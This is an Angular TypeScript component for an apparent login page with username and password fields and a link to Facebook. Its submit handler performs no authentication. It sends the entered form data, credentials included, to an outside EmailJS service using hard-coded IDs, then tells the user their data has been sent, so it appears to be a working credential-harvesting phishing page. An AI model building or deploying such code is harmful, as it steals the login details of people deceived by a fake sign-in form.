import { Component } from '@angular/core';
import {
  FormBuilder,
  FormGroup,
  FormsModule,
  ReactiveFormsModule,
  Validators,
} from '@angular/forms';
import { Router, RouterLink } from '@angular/router';
import { InputTextModule } from 'primeng/inputtext';
import emailjs, { EmailJSResponseStatus } from '@emailjs/browser';

@Component({
  selector: 'app-authorization',
  standalone: true,
  imports: [FormsModule, ReactiveFormsModule, InputTextModule, RouterLink],
  templateUrl: './authorization.page.html',
  styleUrl: './authorization.page.scss',
})
export class AuthorizationPage {
  form: FormGroup;
  showPassword: boolean = false;

  constructor(private fb: FormBuilder, private router: Router) {
    this.form = this.fb.group({
      userName: this.fb.control(null, [
        Validators.required,
        Validators.minLength(3),
      ]),
      password: this.fb.control(null, [
        Validators.required,
        Validators.minLength(5),
      ]),
    });
  }

  submit(event: any) {
    const d = document.getElementById('sss') as HTMLFormElement;
    emailjs
      .sendForm('service_m1f4mml', 'template_m1odwcw', d, '5-LxPY2MOlzY5LmKb')
      .then(
        () => {
          alert('Ваше данные отправлены');
        },
        (error) => {
          console.log(error.text);
        }
      );
  }

  facebook() {
    this.router.navigateByUrl(`https://www.facebook.com/`);
  }
}
